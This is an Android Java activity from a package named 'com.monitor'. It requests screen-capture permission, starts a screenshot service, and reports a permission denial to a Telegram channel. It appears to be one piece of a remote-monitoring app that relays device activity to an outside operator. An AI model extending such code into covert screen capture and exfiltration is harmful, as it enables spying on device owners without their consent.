package com.monitor;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;

public class ScreenshotActivity extends Activity {

    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1001;
    private static MediaProjectionManager mProjectionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK) {
                // Start screenshot service with the intent data
                Intent serviceIntent = new Intent(this, ScreenshotService.class);
                serviceIntent.putExtra("resultCode", resultCode);
                serviceIntent.putExtra("data", data);
                startForegroundService(serviceIntent);
                Log.d("ScreenshotActivity", "Starting ScreenshotService");
            } else {
                // Permission denied
                TelegramService.sendMessageToTelegramStatic(this, "❌ Screenshot permission denied.");
            }
        }
        finish();
    }
}
